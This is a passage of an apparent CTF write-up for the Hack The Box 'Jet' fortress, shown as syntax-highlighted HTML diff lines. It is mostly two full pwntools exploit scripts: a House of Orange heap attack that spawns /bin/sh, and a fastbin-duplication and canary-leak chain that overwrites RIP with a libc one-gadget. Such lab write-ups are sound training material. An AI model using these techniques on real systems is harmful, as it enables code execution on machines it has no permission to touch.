+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span> <span class="k">if</span> <span class="ow">not</span> <span class="nb">type</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">bytes</span> <span class="k">else</span> <span class="n">name</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"6. exit</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">UnsafeEdit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"2"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"2. insecure edit"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"2"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"index:</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"new username:</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span> <span class="k">if</span> <span class="ow">not</span> <span class="nb">type</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">bytes</span> <span class="k">else</span> <span class="n">name</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"6. exit</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">BanUser</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"3"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"index:</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"6. exit</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+
+<span class="n">SetUsername</span><span class="p">(</span><span class="s2">"Jack"</span><span class="p">)</span>
+
+<span class="n">read_address</span> <span class="o">=</span> <span class="n">GetGift</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Leaked read@: 0x</span><span class="si">{</span><span class="n">read_address</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+
+<span class="n">libc_address</span> <span class="o">=</span> <span class="n">read_address</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'read'</span><span class="p">]</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_address</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Leaked libc@: 0x</span><span class="si">{</span><span class="n">libc_address</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Leaked _free_hook@: 0x</span><span class="si">{</span><span class="n">free_hook</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+
+
+<span class="c1"># House of orange attack</span>
+
+<span class="n">name_address</span> <span class="o">=</span> <span class="mh">0x6020a0</span> <span class="c1"># It's static, NO PIE</span>
+
+<span class="c1">## Fake file stream</span>
+<span class="n">padding</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">write_ptr</span><span class="o">=</span><span class="mi">1</span>
+<span class="n">write_end</span><span class="o">=</span><span class="mi">2</span>
+<span class="n">mode</span> <span class="o">=</span> <span class="mh">0xffffffff</span>
+<span class="n">junk_size</span> <span class="o">=</span> <span class="mh">0x11</span> <span class="o">*</span> <span class="mi">8</span>
+<span class="n">vtable_pointer</span> <span class="o">=</span> <span class="n">name_address</span>
+
+<span class="n">fake_file_stream</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_ptr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_end</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"C"</span> <span class="o">*</span> <span class="n">junk_size</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vtable_pointer</span><span class="p">)</span>
+
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Allocate chunks"</span><span class="p">)</span>
+<span class="n">A</span> <span class="o">=</span> <span class="n">AddUser</span><span class="p">(</span><span class="mi">136</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"A"</span><span class="o">*</span><span class="mi">136</span><span class="p">)</span> <span class="c1"># One-byte overflow</span>
+<span class="n">B</span> <span class="o">=</span> <span class="n">AddUser</span><span class="p">(</span><span class="mi">128</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"B"</span><span class="o">*</span><span class="mi">128</span><span class="p">)</span> <span class="c1"># Overlapping Chunk</span>
+<span class="n">C</span> <span class="o">=</span> <span class="n">AddUser</span><span class="p">(</span><span class="mi">228</span><span class="p">,</span> <span class="n">padding</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">fake_file_stream</span><span class="p">)</span> <span class="c1"># Chunk to be freed</span>
+<span class="n">D</span> <span class="o">=</span> <span class="n">AddUser</span><span class="p">(</span><span class="mi">128</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"Dummy"</span><span class="p">)</span> <span class="c1"># Chunk preventing top chunk consolidation</span>
+
+
+<span class="n">io_list_all</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'_IO_list_all'</span><span class="p">]</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Free chunk C"</span><span class="p">)</span>
+<span class="n">BanUser</span><span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="c1"># C to Unsortedbin</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Overflow! B overlaps C"</span><span class="p">)</span>
+<span class="n">UnsafeEdit</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"X"</span><span class="o">*</span><span class="mi">136</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xef</span><span class="s2">"</span><span class="p">)</span> <span class="c1"># Overflow into B chunk head overriding the size field so that B overlaps C</span>
+
+<span class="n">fd_pointer</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span>
+<span class="n">bk_pointer</span> <span class="o">=</span> <span class="n">io_list_all</span> <span class="o">-</span> <span class="mh">0x10</span>
+
+<span class="n">size</span> <span class="o">=</span> <span class="mh">0x61</span> <span class="c1"># small bin overlapping _chain of *_IO_list_all - use sorting to write C chunk to this position</span>
+
+<span class="n">forged_C</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"/bin/sh</span><span class="se">\0</span><span class="s2">"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd_pointer</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk_pointer</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Edit B: prepare unsortedbin attack and C sorting"</span><span class="p">)</span>            
+<span class="n">SafeEdit</span><span class="p">(</span><span class="n">B</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"Y"</span><span class="o">*</span> <span class="mi">128</span> <span class="o">+</span> <span class="n">forged_C</span><span class="p">)</span> <span class="c1"># Prepare the unsortedbin attack</span>
+
+<span class="n">ChangeName</span><span class="p">(</span><span class="n">padding</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'system'</span><span class="p">]))</span> <span class="c1"># Fake vtable</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Trigger unsortedbin"</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"size:</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mi">128</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">))</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>Flag "Member Manager" obtained:</p>
+<p><img alt="sixth-flag.png" src="http://localhost:1337/images/ctf/htb/fortresses/jet/sixth-flag.png"/></p>
+<h3 id="memo-bof-canary-bypass-fastbin-duplication">Memo: BoF - Canary Bypass - Fastbin Duplication</h3>
+<p>This binary is obtained after the <a href="http://localhost:1337/ctf/htb/jet.html#xor-encryption">XOR cracking!</a></p>
+<p>The same <a href="http://localhost:1337/ctf/htb/jet.html#membermanager-heap-house-of-orange-attack">membermanager</a> <em>patchelf</em> steps are applied.</p>
+<p>Running checkseck:</p>
+<blockquote>
+<p>&gt; checksec ./memo<br/>
+<br/>
+[*] '/home/rick/OneDrive/CTF/HTB/Fortresses/Jet/binaryex/memo/memo'<br/>
+    Arch:     amd64-64-little<br/>
+    RELRO:    Full RELRO<br/>
+    Stack:    Canary found<br/>
+    NX:       NX enabled<br/>
+    PIE:      No PIE (0x3fe000)<br/>
+    RUNPATH:  b'./libc'  </p>
+</blockquote>
+<p>The binary is NOT PIE (<strong>Position Independent Executable</strong>).</p>
+<p>Analysing the binary it appears to be vulnerable to both stack and heap oveflow vulnerabilities. There are two main challenges:</p>
+<ul>
+<li><strong>Leak stack and libc address</strong>: solved by a <em>ret2plt</em> attack</li>
+<li><strong>Bypass the canary checking</strong>: having the stack address, it's possible to leak the canary itself</li>
+</ul>
+<p>Overcame these two challenges, it's possible to weaponize the stack smashing vulnerability to override the RIP register with a <strong><em>one gadget</em></strong> address, performing a <em>ret2libc</em> attack;  the stack smashing is exploited via a <em>fastbin duplication</em> heap attack*.</p>
+<ul>
+<li>*Note: it would have been easier to perform an <em>House of Spirit</em> attack.</li>
+</ul>
+<p>Following the exploit used:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">gdb_script</span><span class="o">=</span><span class="s1">'''</span>
+<span class="s1">continue</span>
+<span class="s1">'''</span>
+
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./libc/libc-23.so"</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./memo"</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">"10.13.37.10"</span><span class="p">,</span> <span class="mi">7777</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">"./memo"</span><span class="p">,</span> <span class="n">gdb_script</span><span class="p">)</span> <span class="c1"># type: pwnlib.tubes.process.process</span>
+
+<span class="c1">#p.timeout = 0.5</span>
+
+<span class="k">def</span> <span class="nf">create_memo</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">data2</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"Data: "</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span> <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">str</span> <span class="k">else</span> <span class="n">data</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"Are you done? [yes/no] "</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">data2</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"no</span><span class="se">\0</span><span class="s2">"</span><span class="p">)</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"Data: "</span><span class="p">)</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data2</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span> <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">data2</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">str</span> <span class="k">else</span> <span class="n">data2</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"yes</span><span class="se">\0</span><span class="s2">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"[4] Tap out"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">read_memo</span><span class="p">():</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"2"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"Data: "</span><span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"[4] Tap out"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">result</span>
+
+<span class="k">def</span> <span class="nf">delete_memo</span><span class="p">():</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"3"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"[4] Tap out"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">giveup</span><span class="p">():</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"4"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"Giving up already? [yes/no] "</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"yes</span><span class="se">\0</span><span class="s2">"</span><span class="p">)</span>
+    <span class="c1">#p.recvuntil(b"Quitter!")</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
+
+<span class="k">def</span> <span class="nf">overflow</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"4"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"Giving up already? [yes/no] "</span><span class="p">)</span>
+    <span class="n">base</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"no</span><span class="se">\0</span><span class="s2">"</span>
+    <span class="k">if</span> <span class="n">padding</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"no</span><span class="se">\0</span><span class="s2">"</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"X"</span><span class="o">*</span><span class="mi">21</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"no</span><span class="se">\0</span><span class="s2">"</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"[4] Tap out"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">leak_address</span><span class="p">(</span><span class="n">pointer</span><span class="p">):</span>
+    <span class="n">overflow</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">pointer</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">read_memo</span><span class="p">()</span>
+
+
+<span class="c1"># Leak Stack Address</span>
+<span class="n">create_memo</span><span class="p">(</span><span class="s2">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20</span><span class="p">))</span> <span class="c1"># Stack Leaker</span>
+<span class="n">stack</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">read_memo</span><span class="p">()[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="mh">0x110</span> <span class="c1"># Distance of input buffer from leaked address</span>
+<span class="n">stack</span> <span class="o">=</span> <span class="n">stack</span> <span class="o">-</span> <span class="n">offset</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[!] Stack @: 0x</span><span class="si">{</span><span class="n">stack</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+
+<span class="c1"># Leak PLT address via GOT </span>
+<span class="n">puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak_address</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">])</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[!] puts @: 0x</span><span class="si">{</span><span class="n">puts</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">]</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[!] libc @: 0x</span><span class="si">{</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+
+<span class="c1"># Leak Canary</span>
+<span class="n">overflow</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">+</span> <span class="mi">41</span><span class="p">))</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">read_memo</span><span class="p">()[:</span><span class="mi">7</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[!] Canary @: 0x</span><span class="si">{</span><span class="n">canary</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+
+<span class="n">create_memo</span><span class="p">(</span><span class="sa">b</span><span class="s2">"B"</span><span class="o">*</span><span class="mi">24</span><span class="p">)</span>
+<span class="n">create_memo</span><span class="p">(</span><span class="sa">b</span><span class="s2">"C"</span><span class="o">*</span><span class="mi">24</span><span class="p">)</span>
+<span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">read_memo</span><span class="p">()[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span> <span class="o">+</span> <span class="mh">0x50</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[!] Heap base @: 0x</span><span class="si">{</span><span class="n">heap_base</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+
+<span class="n">one_gadget_offset</span> <span class="o">=</span> <span class="mh">0x45216</span>
+<span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">one_gadget_offset</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[!] One Gadget @: 0x</span><span class="si">{</span><span class="n">one_gadget</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+
+<span class="c1"># 0x20 Fastbin duplication attack</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"-------- FASTBIN DUP ATTACK -------"</span><span class="p">)</span>
+<span class="n">chunk_size</span> <span class="o">=</span> <span class="mh">0x20</span>
+
+<span class="n">create_memo</span><span class="p">(</span><span class="sa">b</span><span class="s2">"V"</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span> <span class="c1"># Vector V</span>
+<span class="n">create_memo</span><span class="p">(</span><span class="sa">b</span><span class="s2">"D"</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span> <span class="c1"># Chunk D(ummy) - in its 3rd quadword will contain previous chunk address</span>
+
+<span class="c1">## Free Vector chunk</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"[&gt;] Freeing first time vector chunk"</span><span class="p">)</span>
+<span class="n">overflow</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">))</span> <span class="c1"># Since free is performed on the last chunk, overflow into the memo (last chunk) pointer setting it to Vector Chunk</span>
+<span class="n">delete_memo</span><span class="p">()</span>
+
+<span class="c1">## Free Dummy chunk: needed to bypass double free mitigation</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"[&gt;] Freeing dummy chunk"</span><span class="p">)</span>
+<span class="n">overflow</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="n">chunk_size</span><span class="p">))</span> <span class="c1"># Setting memo pointer to Dummy Chunk</span>
+<span class="n">delete_memo</span><span class="p">()</span>
+
+<span class="c1">## Free again the vector chunk</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"[&gt;] Freeing twice vector chunk"</span><span class="p">)</span>
+<span class="n">overflow</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">))</span> <span class="c1"># Since free is performed on the last chunk, overflow into the memo (last chunk) pointer setting it to Vector Chunk</span>
+<span class="n">delete_memo</span><span class="p">()</span>
+
+
+<span class="c1"># Set target into fastbin</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"[&gt;] Set target into fastbin"</span><span class="p">)</span>
+<span class="n">create_memo</span><span class="p">(</span><span class="sa">b</span><span class="s2">"A"</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">))</span>
+
+<span class="c1"># Allocate junk to remove useless freed chunks from fastbin</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"[&gt;] Remove junk freed chunk from 0x20 fastbin"</span><span class="p">)</span>
+<span class="n">create_memo</span><span class="p">(</span><span class="sa">b</span><span class="s2">"B"</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span>
+<span class="n">create_memo</span><span class="p">(</span><span class="sa">b</span><span class="s2">"C"</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span>
+
+<span class="c1"># Setup free chunk</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"[&gt;] Override RIP bypassing canary check"</span><span class="p">)</span>
+<span class="n">padding</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">fake_chunk_header</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
+<span class="n">create_memo</span><span class="p">(</span><span class="n">padding</span> <span class="o">+</span> <span class="n">fake_chunk_header</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"Z"</span><span class="o">*</span><span class="mi">16</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span> <span class="p">)</span>
+
+<span class="c1"># By exiting from the current stack frame, the instruction in the RIP is executed</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"[x] Trigger attack"</span><span class="p">)</span>
+<span class="n">giveup</span><span class="p">()</span> 
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>Flag "memo" obtained:</p>
+<p><img alt="eight-flag.png" src="http://localhost:1337/images/ctf/htb/fortresses/jet/eight-flag.png"/></p>
+<h2 id="cryptographic-attacks_1">Cryptographic Attacks</h2>
+<h3 id="xor-encryption">XOR Encryption</h3>
+<p>In "alex" user home there are the following files:</p>
+<ul>
+<li>crypter.py: python script implementing an encryption function</li>
+<li>encrypted.txt: a message encrypted with crypter.py</li>
